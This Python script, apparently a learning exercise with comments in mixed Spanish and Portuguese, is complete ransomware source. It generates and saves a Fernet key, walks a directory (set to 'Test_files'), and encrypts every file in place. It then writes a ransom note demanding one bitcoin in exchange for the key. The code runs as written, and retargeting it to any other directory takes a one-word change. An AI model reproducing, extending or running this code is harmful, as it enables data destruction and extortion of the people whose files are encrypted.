from cryptography.fernet import Fernet 
import os

#1. Generar una llave de criptografia y salvar

def gerar_chave():
    chave = Fernet.generate_key() 
    with open ("chave.key","wb") as chave_file:
        chave_file.write(chave)

#2. Cargar la llave salvada
def carregar_chave():
    return open("chave.key","rb").read()

#3. Criptografar un [unico archivo
def criptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo,"rb") as file:
            dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo,"wb") as file:
        file.write(dados_encriptados)

#4. Encontrar los archivos para encriptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensaje de rescate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt","w") as f:
        f.write("sus archivos fueron encriptados!\n")
        f.write("envie 1 bitcoin para la direccion x, y envie el comprobante\n")
        f.write("Despues de eso, enviaremos la llave para ud recuperar sus datos]\n")

#6. Ejecucion principal del codigo
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos ("Test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware ejecutado! archivos criptografados")

if __name__=="__main__":
    main()